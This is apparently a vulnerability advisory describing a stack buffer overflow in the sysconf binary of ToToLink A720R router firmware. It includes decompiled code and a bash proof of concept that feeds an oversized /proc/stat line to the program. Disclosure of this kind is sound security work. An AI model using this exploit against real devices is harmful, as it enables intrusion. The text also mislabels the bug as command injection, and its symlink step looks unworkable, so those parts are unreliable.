# Buffer Overflow Vulnerability in `/proc/stat`	

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | ToToLink A720R Router                                        |
| Firmware Version     | **V4.1.5cu.614_B20230630** (other versions require verification) |
| Vulnerability Type   | **Stack Buffer Overflow**                                    |
| Vulnerable Component | `sysconf`  binary, sub_401EE0 function                       |
| Prerequisites        | Requires control over `/proc/stat` content or local filesystem write permissions (local exploitation only) |

2. Exploitation Path

```c
int sub_401EE0()
{
  ...
  int v16; // [sp+30h] [-168h] BYREF
  int v17; // [sp+34h] [-164h] BYREF
  int v18; // [sp+38h] [-160h] BYREF
  int v19; // [sp+3Ch] [-15Ch] BYREF
  int v20; // [sp+40h] [-158h] BYREF
  int v21; // [sp+44h] [-154h] BYREF
  int v22; // [sp+48h] [-150h] BYREF
  char v23; // [sp+4Ch] [-14Ch] BYREF
  char v24[32]; // [sp+54h] [-144h] BYREF
  _BYTE v25[128]; // [sp+74h] [-124h] BYREF
  _BYTE v26[132]; // [sp+F4h] [-A4h] BYREF
  ...
  memset(v26, 0, 128);
  sleep(1);
  v5 = fopen("/proc/stat", "r");
  if ( !v5 )
    return -1;
  v33 = v5;
  fgets(v26, 128, v5);
  fclose(v33, v6);
  v23 = 0;
  v22 = 0;
  v21 = 0;
  v20 = 0;
  v19 = 0;
  v18 = 0;
  v17 = 0;
  v16 = 0;
  sscanf(v26, "%s%d%d%d%d%d%d%d", &v23, &v16, &v17, &v18, &v19, &v20, &v21, &v22);
  ...
}
```

3. **Vulnerable Binaries:** `sysconf`.
4. 0-Day Command Injection Exploitation Path: In the `sysconf` file, at line 22, `fgets(v26, 128, v5)` reads content from the `/proc/stat` file. Then, at line 32, `sscanf(v26, "%s%d%d%d%d%d%d%d", &v23, &v16, &v17, &v18, &v19, &v20, &v21, &v22)` parses the string. Here, `v23` is a single-byte `char`, but `%s` writes at least one `\0`, resulting in a buffer overflow vulnerability.
5. Proof of Concept (PoC) for Reproducing the Vulnerabilities:

```bash
# Create a malicious configuration file
mkdir -p /tmp/fakeproc
cat > /tmp/fakeproc/stat <<EOF
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA cpu  1 2 3 4 5 6 7
EOF
ln -sf /tmp/fakeproc/stat /proc/stat
./sysconf
dmesg | tail -n 5
```